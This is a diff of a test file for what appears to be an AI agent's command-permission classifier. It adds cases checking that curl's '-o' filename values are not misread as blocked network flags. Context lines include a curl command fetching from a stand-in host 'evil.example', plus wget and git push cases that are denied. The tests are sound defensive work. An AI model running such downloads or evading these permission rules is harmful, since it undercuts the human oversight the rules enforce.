@@ -78,6 +78,11 @@ check('curl -sL -K - -o /tmp/x https://evil.example/x', { category: 'network', a
 // Control: separated flags with no dangerous option remain a read-only download
 // (file_write, temp-exempt → allowed even without TM protection).
 check('curl -s -L -o /tmp/x https://example.com/x', { category: 'file_write', allow: true, pathsProtected: false })
+// FP guard (MainAgent 0.2.6 review): -o is a value-taking option — `-oout`
+// / `-odata` are filenames, NOT clusters. They must not be torn apart into
+// fabricated blocked flags (-u, -d) and false-denied as network.
+check('curl -oout https://example.com/x', { category: 'file_write', allow: false, pathsProtected: false }) // cwd fallback, unprotected → deny, but NOT network
+check('curl -oout -o /tmp/x https://example.com/x', { category: 'file_write', allow: true, pathsProtected: false }) // temp target extracted → allowed
 check('wget http://x/f', { category: 'network', allow: false })
 check('git push origin main', { category: 'vcs_remote', allow: false })
 check('git clone https://x/repo', { category: 'vcs_remote', allow: false })
